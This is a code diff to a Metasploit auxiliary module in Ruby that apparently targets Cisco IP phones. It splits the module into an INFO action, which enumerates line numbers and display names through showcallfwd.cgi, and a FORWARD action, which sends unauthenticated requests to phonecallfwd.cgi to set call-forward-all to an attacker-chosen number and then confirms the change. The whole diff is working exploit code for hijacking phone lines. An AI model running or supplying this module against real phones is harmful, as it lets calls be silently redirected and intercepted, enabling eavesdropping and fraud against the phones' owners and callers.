@@ -46,24 +46,33 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
+    case action.name.upcase
+    when 'INFO'
+      get_info
+    when 'FORWARD'
+      forward_calls
+    end
+  end
+
+  def get_info
     uri = normalize_uri(target_uri.to_s)
     mac = datastore["MAC"]
-    forward_to = datastore["FORWARDTO"]
 
     print_status("#{peer} - Getting fintnumbers and display names of the IP phone")
 
     res = send_request_cgi(
-      {
-        'uri'    => normalize_uri(uri, 'showcallfwd.cgi'),
-        'method' => 'GET',
-        'vars_get' => {
-          'device' => "SEP#{mac}"
-        }
-      })
+        {
+            'uri'    => normalize_uri(uri, 'showcallfwd.cgi'),
+            'method' => 'GET',
+            'vars_get' => {
+                'device' => "SEP#{mac}"
+            }
+        })
 
     unless res && res.code == 200 && res.body && res.body.to_s =~ /fintnumber/
       print_error("#{peer} - Target appears not vulnerable!")
-      return
+      print_status("#{res}")
+      return []
     end
 
     doc = REXML::Document.new(res.body)
@@ -83,42 +92,57 @@ class Metasploit3 < Msf::Auxiliary
       print_status("#{peer} - Display Name: #{lines[i]}, Fintnumber: #{fint_numbers[i]}")
     end
 
+    fint_numbers
+  end
+
+  def forward_calls
     # for a specific FINTNUMBER redirection
-    fint_numbers = [datastore['FINTNUMBER']] if datastore['FINTNUMBER']
+    uri = normalize_uri(target_uri.to_s)
+    forward_to = datastore["FORWARDTO"]
+    mac = datastore["MAC"]
 
-    if action.name.upcase == "FORWARD"
-      fint_numbers.each do |fintnumber|
+    if datastore['FINTNUMBER']
+      fint_numbers = [datastore['FINTNUMBER']]
+    else
+      fint_numbers = get_info
+    end
 
-        print_status("#{peer} - Sending call forward request for #{fintnumber}")
+    if fint_numbers.empty?
+      print_error("#{peer} - FINTNUMBER required to forward calls")
+      return
+    end
 
-        send_request_cgi(
+    fint_numbers.each do |fintnumber|
+
+      print_status("#{peer} - Sending call forward request for #{fintnumber}")
+
+      send_request_cgi(
           {
-            'uri'    => normalize_uri(uri, 'phonecallfwd.cgi'),
-            'method' => 'GET',
-            'vars_get' => {
-              'cfoption'     => 'CallForwardAll',
-              'device'       => "SEP#{mac}",
-              'ProviderName' => 'NULL',
-              'fintnumber'   => "#{fintnumber}",
-              'telno1'       => "#{forward_to}"
-            }
+              'uri'    => normalize_uri(uri, 'phonecallfwd.cgi'),
+              'method' => 'GET',
+              'vars_get' => {
+                  'cfoption'     => 'CallForwardAll',
+                  'device'       => "SEP#{mac}",
+                  'ProviderName' => 'NULL',
+                  'fintnumber'   => "#{fintnumber}",
+                  'telno1'       => "#{forward_to}"
+              }
           })
 
-        res = send_request_cgi(
+      res = send_request_cgi(
           {
-            'uri'    => normalize_uri(uri, 'showcallfwdperline.cgi'),
-            'method' => 'GET',
-            'vars_get' => {
-              'device'     => "SEP#{mac}",
-              'fintnumber' => "#{fintnumber}"
-            }
+              'uri'    => normalize_uri(uri, 'showcallfwdperline.cgi'),
+              'method' => 'GET',
+              'vars_get' => {
+                  'device'     => "SEP#{mac}",
+                  'fintnumber' => "#{fintnumber}"
+              }
           })
 
-        if res && res.body && res.body && res.body.to_s =~ /CFA/
-          print_good("#{peer} - Call forwarded successfully for #{fintnumber}")
-        else
-          print_status("#{peer} - Call forward failed.")
-        end
+      if res && res.body && res.body && res.body.to_s =~ /CFA/
+        print_good("#{peer} - Call forwarded successfully for #{fintnumber}")
+      else
+        print_status("#{peer} - Call forward failed.")
       end
     end
   end
